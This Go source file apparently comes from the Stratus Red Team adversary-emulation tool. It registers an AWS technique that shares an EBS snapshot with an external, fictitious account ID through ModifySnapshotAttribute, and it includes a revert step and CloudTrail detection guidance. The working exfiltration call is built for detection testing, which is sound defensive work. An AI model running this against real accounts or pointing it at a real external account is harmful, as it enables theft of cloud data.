package aws

import (
	"context"
	_ "embed"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.ec2-share-ebs-snapshot",
		FriendlyName:       "Exfiltrate EBS Snapshot by Sharing It",
		Platform:           stratus.AWS,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Exfiltrates an EBS snapshot by sharing it with an external AWS account.

Warm-up: 

- Create an EBS volume and a snapshot.

Detonation: 

- Call ec2:ModifySnapshotAttribute to share the snapshot with an external, fictitious AWS account.
`,
		Detection: `
Through CloudTrail's <code>ModifySnapshotAttribute</code> event, when <code>requestParameters.createVolumePermission</code> shows
that the EBS snapshot was shared with a new or unknown AWS account, such as:

<pre><code>"requestParameters": {
  "snapshotId": "snap-01b3f7d87a02559a1",
  "attributeType": "CREATE_VOLUME_PERMISSION",
  "createVolumePermission": {
    "add": {
	  "items": [{ "userId": "111111111111" }]
    }
  }
}</code></pre>

An attacker can also make an EBS snapshot completely public. In this case, the <code>item</code> entry 
will look like <code>{"groups":"all"}</code>. 

When an attacker copies the snapshot to their own AWS account or creates an EBS volume for it, the <code>SharedSnapshotCopyInitiated</code> (respectively <code>SharedSnapshotVolumeCreated</code>) event is logged (see [AWS docs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html#shared-snapshot-cloudtrail-logging)). 
In that case, <code>userIdentity.accountId</code> contains the attacker's account ID and <code>recipientAccountId</code> contains the victim's account ID where the snapshot was originally created.

<pre><code>{
  "userIdentity": {
    "invokedBy": "ec2.amazonaws.com",
    "type": "AWSAccount",
    "accountId": "999999999999"
  },
  "eventSource": "ec2.amazonaws.com",
  "eventVersion": "1.08",
  "eventTime": "2022-09-27T07:58:49Z",
  "service": "cloudtrail",
  "eventName": "SharedSnapshotCopyInitiated",
  "eventType": "AwsServiceEvent",
  "eventCategory": "Management",
  "awsRegion": "us-east-1",
    "serviceEventDetails": {
    "snapshotId": "snap-12345"
  },
  "readOnly": false,
  "managementEvent": true,
  "recipientAccountId": "111111111111"
 }
 </code></pre>
 
 Note that detonating this attack technique with Stratus Red Team does *not* simulate an attacker accessing the snapshot from their account (only sharing it publicly from your account).
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var ShareWithAccountId = "012345678912"

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())

	// Find the snapshot to exfiltrate
	ourSnapshotId := params["snapshot_id"]

	// Exfiltrate it
	log.Println("Sharing the volume snapshot " + ourSnapshotId + " with an external AWS account...")

	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
		SnapshotId: &ourSnapshotId,
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Add: []types.CreateVolumePermission{{UserId: &ShareWithAccountId}},
		},
	})

	if err != nil && utils.IsErrorDueToEBSEncryptionByDefault(err) {
		log.Println("Note: Stratus detonated the attack, but the sharing was unsuccessful. " +
			"This is likely because EBS default encryption is enabled in the region. " +
			"Nonetheless, it did simulate a plausible attacker action.")
		return nil
	}

	return err
}

func revert(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	ourSnapshotId := params["snapshot_id"]

	log.Println("Unsharing the volume snapshot " + ourSnapshotId)
	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
		SnapshotId: &ourSnapshotId,
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Remove: []types.CreateVolumePermission{{UserId: &ShareWithAccountId}},
		},
	})
	return err
}
